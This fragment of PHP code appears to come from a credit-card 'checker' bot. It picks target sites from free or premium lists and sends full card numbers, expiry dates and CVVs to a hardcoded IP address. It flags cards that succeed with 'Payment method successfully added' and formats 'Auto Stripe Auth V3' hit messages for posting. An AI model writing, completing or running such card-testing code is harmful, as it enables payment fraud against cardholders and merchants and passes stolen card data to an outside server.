...
if ($sitePackage) {
    $packageFiles = [
        'free' => 'freesitesv3.txt',
        'premium' => 'premiumsitesv3.txt'
    ];
    $file = __DIR__ . '/' . ($packageFiles[$sitePackage] ?? 'freesitesv3.txt');
    if (!file_exists($file)) {
...
$requestUrl = "http://206.206.78.217:1013/?cc={$cc}|{$month}|{$year}|{$cvv}&getSite={$site}";
if ($proxyRequired) {
...
if ((stripos($response, 'Payment method successfully added.') !== false)) {
    ...
    $fullResult =
        ...
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Auto Stripe Auth V3\n" .
        "━━━━━━━━━━━\n" .
    ...
    $publicMessage =
        ...
        "<b>Response ➜</b> {$err} 🎉\n" .
        "<b>Gateway ➜</b> Auto Stripe Auth V3\n" .
        "━━━━━━━━\n" .
